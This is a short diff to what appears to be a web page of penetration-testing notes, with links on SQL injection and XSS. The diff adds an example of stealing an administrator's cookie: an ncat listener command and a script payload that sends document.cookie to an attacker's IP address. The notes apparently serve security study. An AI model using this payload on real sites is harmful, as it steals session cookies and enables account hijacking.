@@ -183,6 +183,10 @@ http://www.anonhack.in/2018/07/boolean-based-blind-sql-injection-how-to-do-manua
 #Great read - https://excess-xss.com/
 #XSS Filter Evasion Cheat Sheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion
 #XSS Filter Evasion eval(String.fromCharCode() method - http://jdstiles.com/java/cct.html
+
+#Example - grabbing admin's cookie
+ncat -lvnp 9002
+<!-- <script>document.write('<img src="http://[IP_ADDRESS]:9002/HiGandosha.txt?cookie=' + document.cookie + '" />')script -->
 </pre>
 <hr>
 <p><h3>XML External Entity (XXE) Injection</h3></p>
